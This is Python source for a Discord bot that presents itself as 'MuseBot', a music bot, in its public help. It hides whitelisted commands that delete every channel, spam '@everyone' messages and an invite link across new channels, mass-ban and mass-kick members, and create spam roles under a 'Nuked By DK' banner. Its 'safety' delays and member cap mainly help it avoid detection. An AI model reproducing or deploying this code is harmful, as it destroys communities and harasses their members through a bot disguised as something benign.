import discord
from discord.ext import commands, tasks
import asyncio
import json
import os
import aiohttp
import yt_dlp
from collections import deque
import datetime
import random
import time

# Bot setup
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='*', intents=intents, help_command=None)

# Configuration
OWNER_ID = 1065537318351540234
OWNER_PREFIX = '+'
whitelisted_users = set()
WHITELIST_FILE = "whitelist.json"

# Spam settings
SPAM_MESSAGES = [
    "@everyone",
    "💀 Nuked By DK 💀", 
    "https://discord.gg/wAEhpXXJVV"
]
SPAM_CHANNEL_NAMES = [
    "nuked-by-dk",
    "destroyed-by-dk", 
    "dk-was-here",
    "fireplayz-nuke",
    "server-nuked"
]
SPAM_CATEGORY_NAME = "💀 NUKED BY DK 💀"
SPAM_ROLE_NAME = "NUKED BY DK"

# Status rotation
STATUS_ROTATION = [
    {"type": "listening", "name": "*help", "status": "online"},
    {"type": "watching", "name": "FirePlayzIsHere's Video", "status": "idle"},
    {"type": "playing", "name": "Songs", "status": "dnd"}
]

# Safety configuration
MAX_DESTRUCTIVE_ACTIONS = 5
ACTION_COOLDOWN = 300  # 5 minutes
OPERATION_DELAY = 2.5  # seconds between operations
NUKE_LOG = {}
RATE_LIMITER = {}

# Music queues
music_queues = {}
now_playing = {}

# Load whitelist
def load_whitelist():
    global whitelisted_users
    try:
        if os.path.exists(WHITELIST_FILE):
            with open(WHITELIST_FILE, 'r') as f:
                data = json.load(f)
                whitelisted_users = set(data.get('whitelisted', []))
                whitelisted_users.add(OWNER_ID)
                print(f"📋 Loaded {len(whitelisted_users)} whitelisted users")
    except Exception as e:
        print(f"❌ Error loading whitelist: {e}")

# Save whitelist
def save_whitelist():
    try:
        data = {'whitelisted': list(whitelisted_users)}
        with open(WHITELIST_FILE, 'w') as f:
            json.dump(data, f, indent=4)
        print(f"💾 Saved {len(whitelisted_users)} whitelisted users")
    except Exception as e:
        print(f"❌ Error saving whitelist: {e}")

# Safety functions
class SafetySystem:
    @staticmethod
    async def check_rate_limit(ctx):
        user_id = ctx.author.id
        now = time.time()
        
        if user_id in RATE_LIMITER:
            if now - RATE_LIMITER[user_id] < ACTION_COOLDOWN:
                await ctx.send("⏳ Rate limited. Wait 5 minutes between destructive commands.", ephemeral=True)
                return False
        
        RATE_LIMITER[user_id] = now
        return True

    @staticmethod
    def check_server_safety(guild):
        # Don't allow in large servers
        if guild.member_count > 25:
            return False, "Server has too many members (>25)"
        
        # Don't allow if bot owns the server
        if guild.owner_id == guild.me.id:
            return False, "I own this server"
            
        return True, "Safe"

    @staticmethod
    def count_user_actions(user_id):
        count = 0
        current_time = time.time()
        
        for action_time in RATE_LIMITER.values():
            if current_time - action_time < 3600:  # 1 hour window
                count += 1
                
        return count

    @staticmethod
    async def log_action(user_id, guild_id, action_type):
        key = f"{user_id}_{guild_id}"
        if key not in NUKE_LOG:
            NUKE_LOG[key] = []
        
        NUKE_LOG[key].append({
            "action": action_type,
            "timestamp": datetime.datetime.now().isoformat(),
            "guild_id": guild_id
        })
        
        # Keep only last 10 actions per user-guild combo
        if len(NUKE_LOG[key]) > 10:
            NUKE_LOG[key] = NUKE_LOG[key][-10:]

# Safe operation functions
async def safe_delete_channel(channel):
    try:
        await asyncio.sleep(OPERATION_DELAY)
        await channel.delete()
        await asyncio.sleep(OPERATION_DELAY)
        return True
    except:
        return False

async def safe_create_channel(guild, name, category=None):
    try:
        await asyncio.sleep(OPERATION_DELAY)
        if category:
            channel = await guild.create_text_channel(name, category=category)
        else:
            channel = await guild.create_text_channel(name)
        await asyncio.sleep(OPERATION_DELAY)
        return channel
    except:
        return None

async def safe_create_role(guild, name):
    try:
        await asyncio.sleep(OPERATION_DELAY)
        role = await guild.create_role(name=name)
        await asyncio.sleep(OPERATION_DELAY)
        return role
    except:
        return None

async def safe_ban_member(member, reason="Nuke command"):
    try:
        await asyncio.sleep(OPERATION_DELAY)
        await member.ban(reason=reason)
        await asyncio.sleep(OPERATION_DELAY)
        return True
    except:
        return False

async def safe_kick_member(member, reason="Nuke command"):
    try:
        await asyncio.sleep(OPERATION_DELAY)
        await member.kick(reason=reason)
        await asyncio.sleep(OPERATION_DELAY)
        return True
    except:
        return False

# Permission checks
def is_whitelisted():
    async def predicate(ctx):
        if ctx.author.id in whitelisted_users or ctx.author.id == OWNER_ID:
            return True
        await ctx.send("❌ You are not whitelisted for this command!", ephemeral=True)
        return False
    return commands.check(predicate)

def is_owner():
    async def predicate(ctx):
        if ctx.author.id == OWNER_ID:
            return True
        await ctx.send("❌ This command is for bot owner only!", ephemeral=True)
        return False
    return commands.check(predicate)

# Status rotation task
@tasks.loop(seconds=60)
async def rotate_status():
    try:
        current_status = STATUS_ROTATION.pop(0)
        STATUS_ROTATION.append(current_status)
        
        activity_type = current_status["type"]
        name = current_status["name"]
        status = current_status["status"]
        
        status_map = {
            "online": discord.Status.online,
            "idle": discord.Status.idle,
            "dnd": discord.Status.dnd
        }
        
        activity_map = {
            "listening": discord.ActivityType.listening,
            "watching": discord.ActivityType.watching,
            "playing": discord.ActivityType.playing
        }
        
        activity = discord.Activity(type=activity_map[activity_type], name=name)
        
        await bot.change_presence(activity=activity, status=status_map[status])
        print(f"🔄 Status changed to: {status} {activity_type} {name}")
    except Exception as e:
        print(f"❌ Status rotation error: {e}")

# Confirmation system
async def get_confirmation(ctx, warning_message):
    embed = discord.Embed(
        title="⚠️ CONFIRMATION REQUIRED",
        description=warning_message,
        color=0xff0000
    )
    embed.add_field(
        name="Warning",
        value="This action is **DESTRUCTIVE** and **IRREVERSIBLE**!",
        inline=False
    )
    embed.add_field(
        name="To confirm",
        value="Type `CONFIRM` within 30 seconds to proceed",
        inline=False
    )
    
    await ctx.send(embed=embed)
    
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.upper() == "CONFIRM"
    
    try:
        msg = await bot.wait_for('message', timeout=30.0, check=check)
        return True
    except asyncio.TimeoutError:
        await ctx.send("⏰ Confirmation timed out. Command cancelled.")
        return False

# Music functions
async def play_audio(ctx, query):
    try:
        voice_client = ctx.guild.voice_client
        if not voice_client:
            if ctx.author.voice:
                voice_client = await ctx.author.voice.channel.connect()
            else:
                await ctx.send("❌ You need to be in a voice channel!")
                return
        
        ydl_opts = {
            'format': 'bestaudio/best',
            'quiet': True,
            'no_warnings': True,
            'default_search': 'ytsearch',
            'noplaylist': True,
        }
        
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(f"ytsearch:{query}", download=False)
            if not info['entries']:
                await ctx.send("❌ No results found!")
                return
            
            track = info['entries'][0]
            audio_url = track['url']
            title = track['title']
            
        FFMPEG_OPTIONS = {
            'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5',
            'options': '-vn'
        }
        
        voice_client.play(discord.FFmpegPCMAudio(audio_url, **FFMPEG_OPTIONS))
        now_playing[ctx.guild.id] = title
        await ctx.send(f"🎶 Now playing: **{title}**")
        
    except Exception as e:
        await ctx.send(f"❌ Error playing audio: {str(e)}")
        print(f"Music error: {e}")

# Spam channel functions
async def create_spam_channels(ctx, amount=25, category_name=SPAM_CATEGORY_NAME):
    """Create spam channels with safety delays"""
    created = 0
    category = None
    
    # Safety check
    safe, reason = SafetySystem.check_server_safety(ctx.guild)
    if not safe:
        await ctx.send(f"❌ Safety check failed: {reason}")
        return 0
    
    try:
        # Create category
        category = await ctx.guild.create_category_channel(category_name)
        await asyncio.sleep(OPERATION_DELAY * 2)
    except:
        pass
    
    for i in range(min(amount, 25)):  # Limit to 25 channels
        try:
            # Create channel with random name
            channel_name = f"{random.choice(SPAM_CHANNEL_NAMES)}-{i+1}"
            channel = await safe_create_channel(ctx.guild, channel_name, category)
            
            if channel:
                # Send spam messages slowly
                for j in range(min(5, 5)):  # Limit to 5 messages per channel
                    msg_content = random.choice(SPAM_MESSAGES)
                    await channel.send(msg_content)
                    await asyncio.sleep(1)  # 1 second between messages
                
                created += 1
        except Exception as e:
            continue
    
    return created

async def delete_all_channels_safe(ctx):
    """Delete all channels with safety delays"""
    deleted = 0
    channels = list(ctx.guild.channels)
    
    # Safety check
    safe, reason = SafetySystem.check_server_safety(ctx.guild)
    if not safe:
        await ctx.send(f"❌ Safety check failed: {reason}")
        return 0
    
    for channel in channels:
        if await safe_delete_channel(channel):
            deleted += 1
            
    return deleted

async def mass_ban_safe(ctx, reason="Nuke command"):
    """Mass ban with safety delays"""
    banned = 0
    members = list(ctx.guild.members)
    
    # Don't ban bots or self
    members = [m for m in members if not m.bot and m.id != ctx.author.id and m.id != ctx.guild.me.id]
    
    for member in members[:15]:  # Limit to 15 bans
        if await safe_ban_member(member, reason):
            banned += 1
            
    return banned

async def mass_kick_safe(ctx, reason="Nuke command"):
    """Mass kick with safety delays"""
    kicked = 0
    members = list(ctx.guild.members)
    
    # Don't kick bots or self
    members = [m for m in members if not m.bot and m.id != ctx.author.id and m.id != ctx.guild.me.id]
    
    for member in members[:15]:  # Limit to 15 kicks
        if await safe_kick_member(member, reason):
            kicked += 1
            
    return kicked

async def mass_role_safe(ctx, amount=10):
    """Create mass roles with safety delays"""
    created = 0
    
    for i in range(min(amount, 10)):  # Limit to 10 roles
        role_name = f"{SPAM_ROLE_NAME}-{i+1}"
        if await safe_create_role(ctx.guild, role_name):
            created += 1
            
    return created

# Bot events
@bot.event
async def on_ready():
    print(f'✅ {bot.user} is online!')
    print(f'📊 Serving {len(bot.guilds)} guilds')
    load_whitelist()
    
    # Start status rotation only if not already running
    try:
        if not rotate_status.is_running():
            rotate_status.start()
    except Exception as e:
        print(f"❌ Status rotation error: {e}")

# Music commands
@bot.command(name='play')
async def play_cmd(ctx, *, query):
    """Play a song from YouTube"""
    await play_audio(ctx, query)

@bot.command(name='pause')
async def pause_cmd(ctx):
    """Pause the current song"""
    voice_client = ctx.guild.voice_client
    if voice_client and voice_client.is_playing():
        voice_client.pause()
        await ctx.send("⏸️ Music paused")
    else:
        await ctx.send("❌ No music is playing!")

@bot.command(name='resume')
async def resume_cmd(ctx):
    """Resume paused music"""
    voice_client = ctx.guild.voice_client
    if voice_client and voice_client.is_paused():
        voice_client.resume()
        await ctx.send("▶️ Music resumed")
    else:
        await ctx.send("❌ Music is not paused!")

@bot.command(name='skip')
async def skip_cmd(ctx):
    """Skip the current song"""
    voice_client = ctx.guild.voice_client
    if voice_client and voice_client.is_playing():
        voice_client.stop()
        await ctx.send("⏭️ Song skipped")
    else:
        await ctx.send("❌ No music is playing!")

@bot.command(name='stop')
async def stop_cmd(ctx):
    """Stop music and leave voice channel"""
    voice_client = ctx.guild.voice_client
    if voice_client:
        await voice_client.disconnect()
        await ctx.send("🛑 Music stopped and bot disconnected")
    else:
        await ctx.send("❌ Bot is not in a voice channel!")

@bot.command(name='np')
async def nowplaying_cmd(ctx):
    """Show currently playing song"""
    if ctx.guild.id in now_playing:
        await ctx.send(f"🎶 Now playing: **{now_playing[ctx.guild.id]}**")
    else:
        await ctx.send("❌ No music is playing!")

# Utility commands
@bot.command(name='help')
async def help_cmd(ctx):
    """Show music commands help"""
    embed = discord.Embed(
        title="🎵 MuseBot Music Commands",
        description="Prefix: `*`",
        color=0x00ff00
    )
    
    embed.add_field(
        name="Music Commands",
        value=(
            "`*play <song>` - Play a song from YouTube\n"
            "`*pause` - Pause current music\n"
            "`*resume` - Resume paused music\n"
            "`*skip` - Skip current song\n"
            "`*stop` - Stop music and disconnect\n"
            "`*np` - Show now playing\n"
        ),
        inline=False
    )
    
    embed.add_field(
        name="Utility Commands",
        value=(
            "`*serverinfo` - Show server information\n"
            "`*userinfo [user]` - Show user information\n"
            "`*ping` - Check bot latency\n"
        ),
        inline=False
    )
    
    await ctx.send(embed=embed)

@bot.command(name='ping')
async def ping_cmd(ctx):
    """Check bot latency"""
    latency = round(bot.latency * 1000)
    await ctx.send(f"🏓 Pong! {latency}ms")

# Secret commands with safety features
@bot.command(name='helpw')
@is_whitelisted()
async def helpw_cmd(ctx):
    """Show secret commands (whitelisted only)"""
    embed = discord.Embed(
        title="🤫 Secret Commands",
        description="These commands are destructive and require confirmation!",
        color=0xff0000
    )
    
    embed.add_field(
        name="Server Management",
        value=(
            "`*nuke` - Nuke server (delete + create spam channels)\n"
            "`*channeladd <amount>` - Create spam channels only\n"
            "`*deletechannel` - Delete all channels only\n"
            "`*massban` - Mass ban all members\n"
            "`*masskick` - Mass kick all members\n"
            "`*massrole` - Create spam roles\n"
        ),
        inline=False
    )
    
    embed.add_field(
        name="Owner Commands",
        value=(
            "`+access add <user>` - Whitelist user\n"
            "`+access remove <user>` - Remove from whitelist\n"
            "`+access list` - List whitelisted users\n"
            "`+restart` - Restart the bot\n"
            "`+guildlist` - Show all servers\n"
            "`+guildleave <id>` - Leave a server\n"
        ),
        inline=False
    )
    
    await ctx.author.send(embed=embed)
    await ctx.send("📨 Check your DMs for secret commands!", ephemeral=True)

@bot.command(name='nuke')
@is_whitelisted()
async def nuke_cmd(ctx):
    """Nuke the server (delete + create spam channels)"""
    # Safety checks
    if not await SafetySystem.check_rate_limit(ctx):
        return
        
    safe, reason = SafetySystem.check_server_safety(ctx.guild)
    if not safe:
        await ctx.send(f"❌ Safety check failed: {reason}")
        return
        
    if not await get_confirmation(ctx, "SLOW MODE: This will take time with safety delays"):
        return
    
    await ctx.send("🔄 Starting safe nuke operation...")
    
    # Delete channels
    deleted = await delete_all_channels_safe(ctx)
    await ctx.send(f"✅ Deleted {deleted} channels")
    
    await asyncio.sleep(5)
    
    # Create spam channels
    created = await create_spam_channels(ctx, 15)
    await ctx.send(f"✅ Created {created} spam channels")
    
    await SafetySystem.log_action(ctx.author.id, ctx.guild.id, "nuke")
    await ctx.send("💣 Server nuke completed with safety measures!")

@bot.command(name='channeladd')
@is_whitelisted()
async def channeladd_cmd(ctx, amount: int = 15):
    """Create spam channels only"""
    if not await SafetySystem.check_rate_limit(ctx):
        return
        
    safe, reason = SafetySystem.check_server_safety(ctx.guild)
    if not safe:
        await ctx.send(f"❌ Safety check failed: {reason}")
        return
        
    if not await get_confirmation(ctx, f"This will create {amount} spam channels slowly"):
        return
    
    created = await create_spam_channels(ctx, min(amount, 20))
    await SafetySystem.log_action(ctx.author.id, ctx.guild.id, "channeladd")
    await ctx.send(f"✅ Created {created} spam channels!")

@bot.command(name='deletechannel')
@is_whitelisted()
async def deletechannel_cmd(ctx):
    """Delete all channels only"""
    if not await SafetySystem.check_rate_limit(ctx):
        return
        
    safe, reason = SafetySystem.check_server_safety(ctx.guild)
    if not safe:
        await ctx.send(f"❌ Safety check failed: {reason}")
        return
        
    if not await get_confirmation(ctx, "This will delete ALL channels slowly"):
        return
    
    deleted = await delete_all_channels_safe(ctx)
    await SafetySystem.log_action(ctx.author.id, ctx.guild.id, "deletechannel")
    await ctx.send(f"✅ Deleted {deleted} channels!")

@bot.command(name='massban')
@is_whitelisted()
async def massban_cmd(ctx):
    """Mass ban all members"""
    if not await SafetySystem.check_rate_limit(ctx):
        return
        
    safe, reason = SafetySystem.check_server_safety(ctx.guild)
    if not safe:
        await ctx.send(f"❌ Safety check failed: {reason}")
        return
        
    if not await get_confirmation(ctx, "This will ban multiple members slowly"):
        return
    
    banned = await mass_ban_safe(ctx)
    await SafetySystem.log_action(ctx.author.id, ctx.guild.id, "massban")
    await ctx.send(f"✅ Banned {banned} members!")

@bot.command(name='masskick')
@is_whitelisted()
async def masskick_cmd(ctx):
    """Mass kick all members"""
    if not await SafetySystem.check_rate_limit(ctx):
        return
        
    safe, reason = SafetySystem.check_server_safety(ctx.guild)
    if not safe:
        await ctx.send(f"❌ Safety check failed: {reason}")
        return
        
    if not await get_confirmation(ctx, "This will kick multiple members slowly"):
        return
    
    kicked = await mass_kick_safe(ctx)
    await SafetySystem.log_action(ctx.author.id, ctx.guild.id, "masskick")
    await ctx.send(f"✅ Kicked {kicked} members!")

@bot.command(name='massrole')
@is_whitelisted()
async def massrole_cmd(ctx, amount: int = 10):
    """Create spam roles"""
    if not await SafetySystem.check_rate_limit(ctx):
        return
        
    safe, reason = SafetySystem.check_server_safety(ctx.guild)
    if not safe:
        await ctx.send(f"❌ Safety check failed: {reason}")
        return
        
    if not await get_confirmation(ctx, f"This will create {amount} spam roles slowly"):
        return
    
    created = await mass_role_safe(ctx, min(amount, 15))
    await SafetySystem.log_action(ctx.author.id, ctx.guild.id, "massrole")
    await ctx.send(f"✅ Created {created} spam roles!")

# Owner commands
@bot.command(name='access')
@is_owner()
async def access_cmd(ctx, action: str, user: discord.User = None):
    """Manage whitelisted users"""
    if action == "add" and user:
        whitelisted_users.add(user.id)
        save_whitelist()
        await ctx.send(f"✅ Added {user.mention} to whitelist!")
    
    elif action == "remove" and user:
        if user.id in whitelisted_users:
            whitelisted_users.remove(user.id)
            save_whitelist()
            await ctx.send(f"❌ Removed {user.mention} from whitelist!")
        else:
            await ctx.send("❌ User is not whitelisted!")
    
    elif action == "list":
        if whitelisted_users:
            user_list = "\n".join([f"<@{uid}>" for uid in whitelisted_users])
            embed = discord.Embed(title="📋 Whitelisted Users", description=user_list)
            await ctx.send(embed=embed)
        else:
            await ctx.send("❌ No whitelisted users!")
    
    else:
        await ctx.send("Usage: `+access add/remove/list @user`")

@bot.command(name='restart')
@is_owner()
async def restart_cmd(ctx):
    """Restart the bot"""
    if not await get_confirmation(ctx, "This will RESTART THE BOT!"):
        return
    
    await ctx.send("🔄 Restarting bot...")
    os.system("python bot.py &")
    await bot.close()

@bot.command(name='guildlist')
@is_owner()
async def guildlist_cmd(ctx):
    """List all guilds"""
    embed = discord.Embed(title="🌐 Servers List", color=0x00ff00)
    
    for guild in bot.guilds:
        embed.add_field(
            name=guild.name,
            value=f"ID: `{guild.id}`\nMembers: {guild.member_count}",
            inline=False
        )
    
    await ctx.send(embed=embed)

@bot.command(name='guildleave')
@is_owner()
async def guildleave_cmd(ctx, guild_id: int):
    """Leave a guild"""
    guild = bot.get_guild(guild_id)
    if guild:
        await guild.leave()
        await ctx.send(f"✅ Left guild: {guild.name}")
    else:
        await ctx.send("❌ Guild not found!")

# Error handling
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        return
    
    embed = discord.Embed(
        title="❌ Command Error",
        description=f"```{str(error)}```",
        color=0xff0000
    )
    await ctx.send(embed=embed)
    print(f"Command error: {error}")

# Run the bot
if __name__ == "__main__":
    # Load environment variables
    from dotenv import load_dotenv
    load_dotenv()
    
    TOKEN = os.getenv('DISCORD_TOKEN')
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("❌ DISCORD_TOKEN not found in environment variables!")
